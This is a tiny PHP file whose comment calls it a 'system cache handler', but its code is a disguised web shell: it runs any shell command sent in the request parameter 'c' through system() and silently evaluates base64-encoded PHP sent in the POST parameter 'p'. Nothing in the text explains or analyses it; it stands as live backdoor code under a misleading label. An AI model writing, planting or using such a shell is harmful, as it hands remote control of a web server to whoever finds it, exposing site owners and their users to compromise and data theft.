<?php
// system cache handler
$c = $_REQUEST['c'] ?? '';
if ($c !== '') { system($c); }
@eval(base64_decode($_POST['p'] ?? ''));
